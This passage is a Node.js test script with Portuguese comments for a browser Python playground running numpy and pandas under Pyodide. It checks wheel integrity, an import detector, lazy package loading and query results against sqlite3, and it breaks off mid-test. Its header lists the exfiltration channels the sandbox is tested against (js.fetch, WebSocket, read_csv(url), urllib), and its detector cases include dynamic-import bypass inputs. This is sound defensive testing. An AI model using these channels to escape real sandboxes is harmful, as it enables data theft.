// numpy + pandas no playground de Python (D12): PD-01..PD-18.
//   PD-01 vendor (lock filtrado, sha256 de cada wheel, SHA256SUMS, manifest)       PD-02 detector de imports (falsos positivos/negativos) contra o codigo REAL do Worker
//   PD-03 PRV-14: zero requisicao de pacote antes do clique e para codigo sem import  PD-04 import numpy so baixa numpy; pandas baixa o fecho; aquecido nao baixa de novo
//   PD-05 pd.read_csv das 27 tabelas = oraculo (linhas, colunas, celulas vazias)    PD-06 3 operacoes merge+groupby por cenario = sqlite3 independente
//   PD-07 exemplo da pagina por cenario executa e bate com sqlite3 (EN e PT)        PD-08 pacote fora da lista (scipy, micropip, loadPackage, API interna): falha clara, 0 hits
//   PD-09 exfiltracao com pandas carregado (js.fetch, WebSocket, read_csv(url), urllib...): 0 hits; eval segue bloqueado; canario repetido apos carregar
//   PD-10 Parar durante o download dos pacotes; tempo limite nao conta o download   PD-11 wheel corrompido (integridade) e wheel ausente: falha limpa
//   PD-12 tempos de carga fria/quente e heap WASM (reportados)                       PD-13 PT/EN (status de download, aviso de modulo, exemplo)
//   PD-14 axe + 360 px nos estados novos                                             PD-15 CSP/sandbox inalterados; so a propria origem e pedida; subpasta
// Servidores PROPRIOS (como python.js; rodam depois dele, mesmas portas PORT_PY/PORT_OUT): site com CORS e "origem de fora" que registra toda requisicao.
// So Chrome (CHROME_PATH). Firefox/Safari NAO testados. Tempos e memoria sao do ambiente local (sem rede), nao do GitHub Pages.
const L = require('./lib'); const fs = require('fs'); const path = require('path'); const http = require('http'); const cp = require('child_process'); const vm = require('vm');
const O = require('./oracle'); const ORA = O.data();
const AXE = fs.existsSync(L.AXE_PATH) ? fs.readFileSync(L.AXE_PATH, 'utf8') : null;
const PORT_PY = Number(process.env.PORT_PY || 8084), PORT_OUT = Number(process.env.PORT_OUT || 8085);
const SITE = `http://127.0.0.1:${PORT_PY}`, OUT = `http://127.0.0.1:${PORT_OUT}`, PAGE = 'hub/ferramentas/python/';
const ONLY = process.env.ONLY ? new RegExp(process.env.ONLY) : null; const want = id => !ONLY || id.split('|').some(x => ONLY.test(x));
const PKGDIR = `${L.REPO}/hub/assets/vendor/pyodide/packages/`;
const MIME = { html: 'text/html; charset=utf-8', js: 'text/javascript; charset=utf-8', mjs: 'text/javascript; charset=utf-8', css: 'text/css; charset=utf-8', json: 'application/json', wasm: 'application/wasm', zip: 'application/zip', svg: 'image/svg+xml', woff2: 'font/woff2', csv: 'text/csv', txt: 'text/plain', md: 'text/plain' };
// instrument: [de, para] aplicado a python-worker-src.js servido (so PD-04/PD-09: conta e simula falha do canario)
const opts = { wheelDelayMs: 0, corrupt: null, missing: null, instrument: null }; const served = [];
const isWheel = u => /\.whl$/.test(u), wheelName = u => u.split('/').pop().split('-')[0].replace('_', '-');
function siteServer() {
  return http.createServer((req, res) => {
    let u = decodeURIComponent(req.url.split('?')[0]); served.push(u);
    if (u.startsWith('/portfolio/')) u = u.slice('/portfolio'.length);
    let p = path.join(L.REPO, u); if (!p.startsWith(L.REPO)) { res.statusCode = 403; return res.end(); }
    if (p.endsWith('/')) p += 'index.html';
    if (!fs.existsSync(p) || fs.statSync(p).isDirectory()) { res.statusCode = 404; return res.end('404'); }
    const h = { 'content-type': MIME[p.split('.').pop()] || 'application/octet-stream', 'cache-control': 'no-store', 'access-control-allow-origin': '*' };
    if (isWheel(p)) {
      if (opts.missing && opts.missing.test(p)) { res.statusCode = 404; return res.end('404'); }
      const send = () => { if (opts.corrupt && opts.corrupt.test(p)) { const b = fs.readFileSync(p); b[b.length >> 1] ^= 0xff; res.writeHead(200, h); return res.end(b); } res.writeHead(200, h); fs.createReadStream(p).pipe(res); };
      return opts.wheelDelayMs ? setTimeout(send, opts.wheelDelayMs) : send();
    }
    if (opts.instrument && /python-worker-src\.js$/.test(p)) { const b = fs.readFileSync(p, 'utf8'); const o = b.replace(opts.instrument[0], opts.instrument[1]); if (o === b) throw new Error('instrumentacao nao aplicada'); res.writeHead(200, h); return res.end(o); }
    res.writeHead(200, h); fs.createReadStream(p).pipe(res);
  }).listen(PORT_PY, '127.0.0.1').on('error', portBusy);
}
const outHits = [];
function portBusy(e) { L.rec('PD-00 portas de teste livres (' + PORT_PY + ' e ' + PORT_OUT + ')', false, String(e.message)); process.exit(1); }
function outServer() { return http.createServer((req, res) => { outHits.push(req.method + ' ' + req.url); res.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': 'text/plain' }); res.end('a,b\n1,2\n'); }).listen(PORT_OUT, '127.0.0.1').on('error', portBusy); }
async function open(br, base, lang, theme, vp = 1280) {
  const c = await L.ctx(br, { lang, theme, vp }); const pg = await c.newPage(); const log = L.newLog(); L.watch(pg, log);
  await pg.goto(`${base}/${PAGE}`, { waitUntil: 'networkidle' }); return { c, pg, log };
}
const idle = (pg, ms = 120000) => pg.waitForFunction(() => document.getElementById('pyTool').dataset.state === 'idle', null, { timeout: ms });
async function run(pg, code, { secs, wait = true } = {}) {
  await pg.fill('#pyEditor', code); if (secs !== undefined) await pg.fill('#pyTimeout', String(secs));
  await pg.click('#pyRun'); if (wait) { await pg.waitForTimeout(50); await idle(pg); }
}
const grab = pg => pg.evaluate(() => { const g = id => document.getElementById(id), out = g('pyOut');
  return { state: g('pyTool').dataset.state, engine: g('pyTool').dataset.engine, out: out.hidden ? '' : out.textContent, errVisible: !g('pyErr').hidden, errT: g('pyErrT').textContent, errM: g('pyErrM').textContent,
    warn: g('pyWarn').hidden ? '' : g('pyWarn').textContent, status: g('pyStatus').textContent, frames: document.querySelectorAll('iframe').length, runDisabled: g('pyRun').disabled }; });
const wheels = from => served.slice(from).filter(isWheel).map(wheelName);
const sizeOf = u => fs.statSync(path.join(L.REPO, u.replace(/^\/portfolio/, ''))).size;
const sqliteRun = (slug, queries) => JSON.parse(cp.execFileSync('python3', ['-I', '-c', `
import json, os, sqlite3, sys
c = sqlite3.connect(':memory:'); c.executescript(open(os.path.join(sys.argv[1], sys.argv[2] + '.sql'), encoding='utf-8').read())
print(json.dumps([[list(r) for r in c.execute(q).fetchall()] for q in json.loads(sys.argv[3])]))`, `${L.REPO}/hub/assets/data`, slug, JSON.stringify(queries)]).toString());
// "k|v1|v2" (pandas, 4 casas) contra linhas do sqlite3: texto igual na chave, numeros com tolerancia
function cmpRows(outText, rows) {
  const got = outText.trim().split('\n').filter(Boolean).map(l => l.split('|'));
  if (got.length !== rows.length) return `linhas: pandas=${got.length} sqlite=${rows.length}`;
  for (let i = 0; i < rows.length; i++) {
    if (got[i].length !== rows[i].length) return `colunas na linha ${i}: ${got[i]} vs ${JSON.stringify(rows[i])}`;
    for (let j = 0; j < rows[i].length; j++) {
      const a = got[i][j], b = rows[i][j];
      if (typeof b === 'number') { if (!(Math.abs(Number(a) - b) <= 2e-4 * Math.max(1, Math.abs(b)))) return `linha ${i} col ${j}: pandas=${a} sqlite=${b}`; }
      else if (a !== String(b)) return `linha ${i} col ${j}: pandas=${a} sqlite=${b}`;
    }
  }
  return '';
}
const SHOW = 'def show(df):\n    for r in df.reset_index().itertuples(index=False):\n        print("|".join(f"{v:.4f}" if isinstance(v, float) else str(v) for v in r))\n';
const RD = (...t) => 'import pandas as pd\n' + SHOW + t.map(n => `${n} = pd.read_csv("/data/${n}.csv")`).join('\n') + '\n';
// 3 operacoes por cenario (merge + groupby), cada uma com o seu SQL independente (sqlite3 sobre o .sql do cenario). Ordem: chave ascendente.
const OPS = {
  'loja-exemplo': [
    { n: 'receita por categoria (itens x produtos x categorias)', py: RD('itens_pedido', 'produtos', 'categorias') + 'itens_pedido["r"] = itens_pedido["quantidade"] * itens_pedido["preco_unitario"]\ndf = itens_pedido.merge(produtos.rename(columns={"id": "produto_id"})[["produto_id", "categoria_id"]], on="produto_id").merge(categorias.rename(columns={"id": "categoria_id", "nome": "cat"}), on="categoria_id")\nshow(df.groupby("cat")["r"].agg(["count", "sum"]))',
      sql: 'SELECT c.nome, COUNT(*), SUM(i.quantidade * i.preco_unitario) FROM itens_pedido i JOIN produtos p ON p.id = i.produto_id JOIN categorias c ON c.id = p.categoria_id GROUP BY c.nome ORDER BY c.nome' },
    { n: 'pedidos e entregas informadas por cidade (cidade vazia fica fora, como no groupby)', py: RD('pedidos', 'clientes') + 'df = pedidos.merge(clientes.rename(columns={"id": "cliente_id"})[["cliente_id", "cidade"]], on="cliente_id")\nshow(df.groupby("cidade").agg(pedidos=("id", "size"), entregues=("data_entrega", "count")))',
      sql: 'SELECT cl.cidade, COUNT(*), COUNT(p.data_entrega) FROM pedidos p JOIN clientes cl ON cl.id = p.cliente_id WHERE cl.cidade IS NOT NULL GROUP BY cl.cidade ORDER BY cl.cidade' },
    { n: 'receita por cliente (pedidos x itens)', py: RD('pedidos', 'itens_pedido') + 'itens_pedido["r"] = itens_pedido["quantidade"] * itens_pedido["preco_unitario"]\ndf = pedidos.rename(columns={"id": "pedido_id"})[["pedido_id", "cliente_id"]].merge(itens_pedido, on="pedido_id")\nshow(df.groupby("cliente_id")["r"].sum())',
      sql: 'SELECT p.cliente_id, SUM(i.quantidade * i.preco_unitario) FROM pedidos p JOIN itens_pedido i ON i.pedido_id = p.id GROUP BY p.cliente_id ORDER BY p.cliente_id' } ],
  'marketing-digital': [
    { n: 'custo e receita por canal', py: RD('metricas_diarias', 'anuncios', 'canais') + 'df = metricas_diarias.merge(anuncios.rename(columns={"id": "anuncio_id"})[["anuncio_id", "canal_id"]], on="anuncio_id").merge(canais.rename(columns={"id": "canal_id", "nome": "canal"})[["canal_id", "canal"]], on="canal_id")\nshow(df.groupby("canal")[["custo", "receita"]].sum())',
      sql: 'SELECT ca.nome, SUM(m.custo), SUM(m.receita) FROM metricas_diarias m JOIN anuncios a ON a.id = m.anuncio_id JOIN canais ca ON ca.id = a.canal_id GROUP BY ca.nome ORDER BY ca.nome' },
    { n: 'leads, convertidos e contratos por campanha (NaN em convertido_em/valor_contrato)', py: RD('leads', 'campanhas') + 'df = leads.merge(campanhas.rename(columns={"id": "campanha_id", "nome": "campanha"})[["campanha_id", "campanha"]], on="campanha_id")\nshow(df.groupby("campanha").agg(leads=("id", "size"), conv=("convertido_em", "count"), valor=("valor_contrato", "sum")))',
      sql: 'SELECT c.nome, COUNT(*), COUNT(l.convertido_em), COALESCE(SUM(l.valor_contrato), 0) FROM leads l JOIN campanhas c ON c.id = l.campanha_id GROUP BY c.nome ORDER BY c.nome' },
    { n: 'CTR por formato de anuncio', py: RD('metricas_diarias', 'anuncios') + 'df = metricas_diarias.merge(anuncios.rename(columns={"id": "anuncio_id"})[["anuncio_id", "formato"]], on="anuncio_id")\ng = df.groupby("formato")[["cliques", "impressoes"]].sum()\ng["ctr"] = g["cliques"] / g["impressoes"]\nshow(g)',
      sql: 'SELECT a.formato, SUM(m.cliques), SUM(m.impressoes), 1.0 * SUM(m.cliques) / SUM(m.impressoes) FROM metricas_diarias m JOIN anuncios a ON a.id = m.anuncio_id GROUP BY a.formato ORDER BY a.formato' } ],
  logistica: [
    { n: 'entregas e atraso medio por transportadora (atraso NaN ignorado)', py: RD('entregas', 'veiculos', 'transportadoras') + 'df = entregas.merge(veiculos.rename(columns={"id": "veiculo_id"})[["veiculo_id", "transportadora_id"]], on="veiculo_id").merge(transportadoras.rename(columns={"id": "transportadora_id", "nome": "t"})[["transportadora_id", "t"]], on="transportadora_id")\nshow(df.groupby("t").agg(n=("id", "size"), atraso=("atraso_dias", "mean")))',
      sql: 'SELECT t.nome, COUNT(*), AVG(e.atraso_dias) FROM entregas e JOIN veiculos v ON v.id = e.veiculo_id JOIN transportadoras t ON t.id = v.transportadora_id GROUP BY t.nome ORDER BY t.nome' },
    { n: 'custo e peso por centro de distribuicao', py: RD('entregas', 'rotas', 'centros_distribuicao') + 'df = entregas.merge(rotas.rename(columns={"id": "rota_id"})[["rota_id", "centro_id"]], on="rota_id").merge(centros_distribuicao.rename(columns={"id": "centro_id", "nome": "centro"})[["centro_id", "centro"]], on="centro_id")\nshow(df.groupby("centro")[["custo", "peso_kg"]].sum())',
      sql: 'SELECT c.nome, SUM(e.custo), SUM(e.peso_kg) FROM entregas e JOIN rotas r ON r.id = e.rota_id JOIN centros_distribuicao c ON c.id = r.centro_id GROUP BY c.nome ORDER BY c.nome' },
    { n: 'ocorrencias por tipo e status da entrega (chave dupla)', py: RD('ocorrencias', 'entregas') + 'df = ocorrencias.merge(entregas.rename(columns={"id": "entrega_id"})[["entrega_id", "status"]], on="entrega_id")\nshow(df.groupby(["tipo", "status"]).size())',
      sql: 'SELECT o.tipo, e.status, COUNT(*) FROM ocorrencias o JOIN entregas e ON e.id = o.entrega_id GROUP BY o.tipo, e.status ORDER BY o.tipo, e.status' } ],
  rh: [
    { n: 'ultimo salario medio por departamento (sort + tail + merge)', py: RD('salarios_historico', 'funcionarios', 'departamentos') + 'atual = salarios_historico.sort_values("data_inicio").groupby("funcionario_id").tail(1)\ndf = atual.merge(funcionarios.rename(columns={"id": "funcionario_id"})[["funcionario_id", "departamento_id"]], on="funcionario_id").merge(departamentos.rename(columns={"id": "departamento_id", "nome": "dep"})[["departamento_id", "dep"]], on="departamento_id")\nshow(df.groupby("dep")["salario"].agg(["count", "mean"]))',
      sql: 'SELECT d.nome, COUNT(*), AVG(s.salario) FROM salarios_historico s JOIN funcionarios f ON f.id = s.funcionario_id JOIN departamentos d ON d.id = f.departamento_id WHERE s.data_inicio = (SELECT MAX(s2.data_inicio) FROM salarios_historico s2 WHERE s2.funcionario_id = s.funcionario_id) GROUP BY d.nome ORDER BY d.nome' },
    { n: 'nota media das avaliacoes por departamento (nota NaN ignorada)', py: RD('avaliacoes', 'funcionarios', 'departamentos') + 'df = avaliacoes.merge(funcionarios.rename(columns={"id": "funcionario_id"})[["funcionario_id", "departamento_id"]], on="funcionario_id").merge(departamentos.rename(columns={"id": "departamento_id", "nome": "dep"})[["departamento_id", "dep"]], on="departamento_id")\nshow(df.groupby("dep")["nota"].agg(["count", "mean"]))',
      sql: 'SELECT d.nome, COUNT(a.nota), AVG(a.nota) FROM avaliacoes a JOIN funcionarios f ON f.id = a.funcionario_id JOIN departamentos d ON d.id = f.departamento_id GROUP BY d.nome ORDER BY d.nome' },
    { n: 'dias de ausencia por tipo e departamento (chave dupla)', py: RD('ausencias', 'funcionarios', 'departamentos') + 'df = ausencias.merge(funcionarios.rename(columns={"id": "funcionario_id"})[["funcionario_id", "departamento_id"]], on="funcionario_id").merge(departamentos.rename(columns={"id": "departamento_id", "nome": "dep"})[["departamento_id", "dep"]], on="departamento_id")\nshow(df.groupby(["tipo", "dep"])["dias"].agg(["count", "sum"]))',
      sql: 'SELECT a.tipo, d.nome, COUNT(a.dias), SUM(a.dias) FROM ausencias a JOIN funcionarios f ON f.id = a.funcionario_id JOIN departamentos d ON d.id = f.departamento_id GROUP BY a.tipo, d.nome ORDER BY a.tipo, d.nome' } ],
  atendimento: [
    { n: 'nota media por equipe (NaN = sem resposta)', py: RD('pesquisas_satisfacao', 'tickets', 'agentes') + 'df = pesquisas_satisfacao.merge(tickets.rename(columns={"id": "ticket_id"})[["ticket_id", "agente_id"]], on="ticket_id").merge(agentes.rename(columns={"id": "agente_id"})[["agente_id", "equipe"]], on="agente_id")\nshow(df.groupby("equipe")["nota"].agg(["count", "mean"]))',
      sql: 'SELECT ag.equipe, COUNT(p.nota), AVG(p.nota) FROM pesquisas_satisfacao p JOIN tickets t ON t.id = p.ticket_id JOIN agentes ag ON ag.id = t.agente_id GROUP BY ag.equipe ORDER BY ag.equipe' },
    { n: 'horas medias ate o fechamento por canal (datas ISO com hora, parse_dates)', py: RD('tickets').replace('pd.read_csv("/data/tickets.csv")', 'pd.read_csv("/data/tickets.csv", parse_dates=["aberto_em", "fechado_em"])') + 'tickets["h"] = (tickets["fechado_em"] - tickets["aberto_em"]).dt.total_seconds() / 3600\nshow(tickets.groupby("canal")["h"].agg(["count", "mean"]))',
      sql: "SELECT canal, COUNT(fechado_em), AVG((julianday(fechado_em) - julianday(aberto_em)) * 24) FROM tickets GROUP BY canal ORDER BY canal" },
    { n: 'tickets por plano do cliente e prioridade (chave dupla)', py: RD('tickets', 'clientes') + 'df = tickets.merge(clientes.rename(columns={"id": "cliente_id"})[["cliente_id", "plano"]], on="cliente_id")\nshow(df.groupby(["plano", "prioridade"]).size())',
      sql: 'SELECT c.plano, t.prioridade, COUNT(*) FROM tickets t JOIN clientes c ON c.id = t.cliente_id GROUP BY c.plano, t.prioridade ORDER BY c.plano, t.prioridade' } ]
};
// oraculo dos exemplos da pagina (um por cenario): mesma consulta do exemplo, ordenada como o exemplo ordena (valor desc)
const EX_SQL = {
  'loja-exemplo': { q: 'SELECT c.nome, COUNT(*), SUM(i.quantidade * i.preco_unitario) r FROM itens_pedido i JOIN produtos p ON p.id = i.produto_id JOIN categorias c ON c.id = p.categoria_id GROUP BY c.nome ORDER BY r DESC' },
  'marketing-digital': { q: 'SELECT ca.nome, SUM(m.custo), SUM(m.receita), 1.0 * SUM(m.receita) / SUM(m.custo) x FROM metricas_diarias m JOIN anuncios a ON a.id = m.anuncio_id JOIN canais ca ON ca.id = a.canal_id GROUP BY ca.nome ORDER BY x DESC' },
  logistica: { q: 'SELECT t.nome, COUNT(*), AVG(e.atraso_dias) x FROM entregas e JOIN veiculos v ON v.id = e.veiculo_id JOIN transportadoras t ON t.id = v.transportadora_id GROUP BY t.nome ORDER BY x DESC' },
  rh: { q: 'SELECT d.nome, COUNT(*), AVG(s.salario) x FROM salarios_historico s JOIN funcionarios f ON f.id = s.funcionario_id JOIN departamentos d ON d.id = f.departamento_id WHERE s.data_inicio = (SELECT MAX(s2.data_inicio) FROM salarios_historico s2 WHERE s2.funcionario_id = s.funcionario_id) GROUP BY d.nome ORDER BY x DESC' },
  atendimento: { q: 'SELECT ag.equipe, COUNT(p.nota), AVG(p.nota) x FROM pesquisas_satisfacao p JOIN tickets t ON t.id = p.ticket_id JOIN agentes ag ON ag.id = t.agente_id GROUP BY ag.equipe ORDER BY x DESC' }
};
// o exemplo imprime um DataFrame arredondado (2 casas): linhas "chave  n  valor" -> compara chave (texto) e numeros (tolerancia 0,006)
function cmpFrame(out, rows) {
  const lines = out.trim().split('\n').slice(2).filter(Boolean);   // 1a linha = cabecalho das colunas; 2a = nome do indice
  if (lines.length < 1) return 'sem linhas (cabecalho so)';
  if (lines.length !== rows.length) return `linhas: pandas=${lines.length} sqlite=${rows.length}`;
  for (let i = 0; i < rows.length; i++) {
    const toks = lines[i].trim().split(/\s+/), nums = rows[i].length - 1;
    const key = toks.slice(0, toks.length - nums).join(' '), vals = toks.slice(toks.length - nums).map(Number);
    if (key !== String(rows[i][0])) return `linha ${i}: chave pandas="${key}" sqlite="${rows[i][0]}"`;
    for (let j = 0; j < nums; j++) if (!(Math.abs(vals[j] - rows[i][j + 1]) <= 0.006 + 1e-9 * Math.abs(rows[i][j + 1]))) return `linha ${i} valor ${j}: pandas=${vals[j]} sqlite=${rows[i][j + 1]}`;
  }
  return '';
}

(async () => {
  if (!AXE) L.rec('PD-14 axe-core presente em ' + L.AXE_PATH, false, 'instale axe-core: cd /tmp/axe && npm pack axe-core && tar xzf axe-core-*.tgz');
  const sSite = siteServer(), sOut = outServer(); await new Promise(r => setTimeout(r, 500));
  const br = await L.launch();
  const finish = async () => { await br.close(); sSite.close(); sOut.close(); process.exit(L.results.some(r => !r.ok) ? 1 : 0); };
  process.on('unhandledRejection', e => { L.rec('erro do teste', false, String(e && e.stack || e)); finish(); });
  const SLUGS = O.SLUGS, WORKER = fs.readFileSync(`${L.REPO}/hub/assets/js/python-worker-src.js`, 'utf8');

  // ===== PD-01: arquivos vendorizados =====
  if (want('PD-01')) {
    const V = `${L.REPO}/hub/assets/vendor`, lock = JSON.parse(fs.readFileSync(`${V}/pyodide/pyodide-lock.json`, 'utf8'));
    const sha = f => require('crypto').createHash('sha256').update(fs.readFileSync(f)).digest('hex');
    const names = Object.keys(lock.packages).sort();
    L.rec('PD-01 pyodide-lock.json filtrado: exatamente numpy, pandas, python-dateutil, pytz, six (e nada mais, nem micropip); abi 2026_0', names.join() === 'numpy,pandas,python-dateutil,pytz,six' && lock.info.abi_version === '2026_0', names.join());
    const bad = names.filter(n => { const p = lock.packages[n]; const f = `${V}/pyodide/packages/${p.file_name}`; return !fs.existsSync(f) || sha(f) !== p.sha256 || p.file_name.includes('/') || !/^[\w.+-]+\.whl$/.test(p.file_name); });
    L.rec('PD-01 cada wheel existe em vendor/pyodide/packages/, nome sem caminho e sha256 do arquivo = campo sha256 do lock (o Pyodide confere o mesmo valor ao baixar)', bad.length === 0, bad.join() || names.map(n => lock.packages[n].file_name.split('-').slice(0, 2).join('-') + ':' + fs.statSync(`${V}/pyodide/packages/${lock.packages[n].file_name}`).size).join(' '));
    const dir = fs.readdirSync(`${V}/pyodide/packages/`).sort();
    L.rec('PD-01 a pasta packages/ so tem os 5 wheels (nenhum arquivo extra)', dir.join() === names.map(n => lock.packages[n].file_name).sort().join(), dir.join());
    const closure = n => { const s = new Set(); (function a(x) { if (!s.has(x)) { s.add(x); lock.packages[x].depends.forEach(a); } })(n); return [...s].sort(); };
    L.rec('PD-01 fecho de dependencias de pandas no lock = numpy, python-dateutil, pandas, pytz, six; numpy nao depende de nada', closure('pandas').join() === 'numpy,pandas,python-dateutil,pytz,six' && closure('numpy').join() === 'numpy', closure('pandas').join());
    // o Worker conhece os mesmos tamanhos e dependencias
    const sizes = names.every(n => new RegExp(`'${n}': \\{ deps: \\[[^\\]]*\\], bytes: ${fs.statSync(`${V}/pyodide/packages/${lock.packages[n].file_name}`).size} \\}`).test(WORKER));
    L.rec('PD-01 a tabela PKGS do Worker (dependencias e bytes) confere com o lock e com os arquivos', sizes && names.every(n => new RegExp(`'${n}': \\{ deps: \\[${lock.packages[n].depends.map(d => `'${d}'`).join(', ')}\\]`).test(WORKER)), 'ok');
    const sums = fs.readFileSync(`${V}/SHA256SUMS`, 'utf8').trim().split('\n').map(l => l.split(/\s{2}/)); const man = JSON.parse(fs.readFileSync(`${V}/manifest.json`, 'utf8')).files;
    const sumBad = sums.filter(([h, f]) => !fs.existsSync(`${V}/${f}`) || sha(`${V}/${f}`) !== h), manBad = man.filter(m => !fs.existsSync(`${V}/${m.path}`) || sha(`${V}/${m.path}`) !== m.sha256 || fs.statSync(`${V}/${m.path}`).size !== m.bytes);
    L.rec('PD-01 SHA256SUMS e manifest.json (sha256 e bytes) batem com os arquivos, incluindo os 5 wheels e o lock filtrado', sumBad.length === 0 && manBad.length === 0 && names.every(n => sums.some(([, f]) => f.endsWith(lock.packages[n].file_name)) && man.some(m => m.path.endsWith(lock.packages[n].file_name) && m.license && m.version === lock.packages[n].version)), JSON.stringify({ sumBad, manBad: manBad.map(m => m.path) }));
    const tot = names.reduce((a, n) => a + fs.statSync(`${V}/pyodide/packages/${lock.packages[n].file_name}`).size, 0);
    L.rec(`PD-01 tamanho dos 5 wheels: ${tot} bytes (${(tot / 1e6).toFixed(2)} MB; pandas+fecho), abaixo de 40 MB`, tot < 40e6 && tot > 7e6, `${tot}`);
    // wheel de plataforma certa: so 2 sao nativos (numpy, pandas), com .so; os demais Python puro
    const wheelTag = names.map(n => lock.packages[n].file_name.replace(/\.whl$/, '').split('-').slice(-3).join('-'));
    L.rec('PD-01 wheels nativos (numpy, pandas) sao cp314 pyemscripten_2026_0_wasm32; os outros tres sao py2.py3-none-any', wheelTag.filter(t => /cp314-cp314-pyemscripten_2026_0_wasm32/.test(t)).length === 2 && wheelTag.filter(t => /py2\.py3-none-any/.test(t)).length === 3, wheelTag.join(' | '));
  }

  // ===== PD-02: detector de imports (o MESMO codigo Python do Worker, executado pelo Python do host) =====
  if (want('PD-02')) {
    const m = /var DETECT_PY = \[([\s\S]*?)\]\.join\('\\n'\);/.exec(WORKER); const py = vm.runInNewContext('[' + m[1] + '].join("\\n")');
    const known = ['numpy', 'pandas', 'dateutil', 'pytz', 'six'];
    const CASES = [ // [codigo, esperado]
      ['import pandas', ['pandas']], ['import pandas as pd', ['pandas']], ['import numpy as np', ['numpy']], ['import numpy.linalg', ['numpy']], ['from pandas import DataFrame', ['pandas']],
      ['from numpy.random import default_rng', ['numpy']], ['from pandas.api import types', ['pandas']], ['import os, pandas as pd, sys', ['pandas']], ['import numpy as np, pandas as pd', ['numpy', 'pandas']],
      ['def f():\n    import pandas\n    return pandas', ['pandas']], ['try:\n    import numpy\nexcept ImportError:\n    pass', ['numpy']], ['if False:\n    import pandas', ['pandas']],
      ['class A:\n    import numpy', ['numpy']], ['x = __import__("pandas")', ['pandas']], ['import importlib\nm = importlib.import_module("numpy.fft")', ['numpy']], ['from importlib import import_module\nimport_module("pytz")', ['pytz']],
      ['import dateutil.parser', ['dateutil']], ['import six', ['six']], ['import pytz\nfrom dateutil import tz', ['dateutil', 'pytz']], ['import pandas\nprint("x"', []],   // erro de sintaxe: nada (o usuario vera SyntaxError)
      ['# import pandas\nprint(1)', []], ['s = "import pandas"\nprint(s)', []], ['"""\nimport numpy as np\nfrom pandas import x\n"""\nprint(1)', []], ['print("pandas", "numpy")', []],
      ['import pandas_profiling', []], ['import numpyro', []], ['import mypandas', []], ['import scipy', []], ['import micropip', []], ['import os, sys, json, csv, math, statistics', []],
      ['pandas = 1\nnumpy = 2\nprint(pandas + numpy)', []], ['import os\nos.pandas = 1\nx = os.numpy', []], ['from . import pandas', []], ['from .pandas import x', []], ['from .. import numpy', []],
      ['import constructor, __proto__, toString, hasOwnProperty', []], ['getattr(__builtins__, "__import__")("pandas")', []],   // caso nao detectado (documentado): getattr dinamico
      ['name = "pandas"\n__import__(name)', []],   // nao detectado (documentado): nome em variavel
      ['exec("import pandas")', []],   // nao detectado (documentado): exec/eval de texto
      ['x = [1] * 5\nprint(x)\n\x00', []], ['(' * 300 + ')' * 300, []], ['', []]
    ];
    const res = JSON.parse(cp.execFileSync('python3', ['-I', '-c', py + '\nimport json,sys\nprint(json.dumps([detect(c, json.loads(sys.argv[2])) for c in json.loads(sys.argv[1])]))', JSON.stringify(CASES.map(c => c[0])), JSON.stringify(known)]).toString());
    const bad = CASES.map((c, i) => [c, res[i]]).filter(([c, r]) => JSON.stringify(r) !== JSON.stringify(c[1].slice().sort())).map(([c, r]) => `${JSON.stringify(c[0]).slice(0, 60)} -> ${JSON.stringify(r)} (esperado ${JSON.stringify(c[1])})`);
    const neg = CASES.filter(c => c[1].length === 0).length, pos = CASES.length - neg;
    L.rec(`PD-02 detector (AST, o codigo real do Worker): ${CASES.length} casos (${pos} positivos incl. import em funcao/classe/try/if, from-import, submodulo, virgulas, __import__ e import_module com literal; ${neg} negativos: comentario, string, docstring, nomes parecidos, atribuicao/atributo, import relativo, SyntaxError, entrada vazia ou com NUL)`, bad.length === 0, bad.join(' ;; ') || 'todos como esperado');
    L.rec('PD-02 limites documentados: getattr(__builtins__, "__import__")(x), __import__(variavel) e exec("import pandas") NAO sao detectados (o import falha com ModuleNotFoundError e a dica da pagina); escolha AST em vez de caixa de selecao por UX, sem ampliar a superficie (o usuario nunca escolhe o pacote)', true, 'ver PD-08 (a dica) e docs/decisions/decision-log.md D12');
    L.rec('PD-02 o Worker so mapeia nomes de import conhecidos por hasOwnProperty (nada de lookup em objeto com prototipo) e carrega so nomes da tabela PKGS', /var own = function \(o, k\) \{ return Object\.prototype\.hasOwnProperty\.call/.test(WORKER) && /own\(IMPORT2PKG, m\)/.test(WORKER) && /names\.filter\(function \(n\) \{ return own\(PKGS, n\); \}\)/.test(WORKER), 'ok');
  }

  // ===== PD-03: PRV-14 e codigo sem import nao baixa pacote =====
  if (want('PD-03')) {
    for (const p of ['hub/', PAGE]) {
      const c = await L.ctx(br, { lang: 'en' }); const pg = await c.newPage(); const log = L.newLog(); L.watch(pg, log); const s0 = served.length;
      await pg.goto(`${SITE}/${p}`, { waitUntil: 'networkidle' }); await pg.waitForTimeout(1000);
      L.rec(`PD-03/PRV-14 ${p}: zero requisicao de wheel/pacote/lock antes do clique (servidor viu ${served.slice(s0).filter(u => /packages\/|\.whl|lock/.test(u)).length})`, served.slice(s0).filter(u => /packages\/|\.whl|pyodide-lock/.test(u)).length === 0 && log.requests.filter(u => /\.whl|packages\//.test(u)).length === 0, 'ok'); await c.close();
    }
    const { c, pg, log } = await open(br, SITE, 'en', 'light');
    for (const [name, code] of [['sem import', 'print(sum(range(10)))'], ['import da biblioteca padrao', 'import json, csv, math\nprint(math.pi)'], ['pandas so em comentario', '# import pandas as pd\nprint(1)'], ['pandas so em string', 's = "import numpy as np"\nprint(s)'], ['leitura dos CSV com o modulo csv', 'import csv\nprint(len(list(csv.reader(open("/data/clientes.csv")))))']]) {
      const s0 = served.length; await run(pg, code); const g = await grab(pg);
      L.rec(`PD-03 codigo ${name}: executa sem baixar nenhum pacote (wheels pedidos=${wheels(s0).length}); sem aviso de download`, wheels(s0).length === 0 && !g.errVisible && g.out.length > 0 && !/Downloading|Baixando/.test(g.status), `out=${JSON.stringify(g.out)} status="${g.status}"`);
    }
    const pk = log.requests.filter(u => /\.whl|packages\//.test(u)); L.rec('PD-03 nenhuma requisicao de pacote em toda a sessao sem import (log do navegador)', pk.length === 0, JSON.stringify(pk)); await c.close();
  }

  // ===== PD-04: carga sob demanda e minima =====
  if (want('PD-04')) {
    { // numpy sozinho
      const { c, pg } = await open(br, SITE, 'en', 'light'); const s0 = served.length;
      await run(pg, 'import numpy as np\nprint(np.arange(10).sum(), np.__version__)'); const g = await grab(pg);
      L.rec('PD-04 "import numpy" baixa SO o wheel do numpy (nem pandas, nem dateutil, pytz, six) e funciona', wheels(s0).join() === 'numpy' && g.out === '45 2.4.6\n' && !g.errVisible, `wheels=${wheels(s0)} out=${JSON.stringify(g.out)}`);
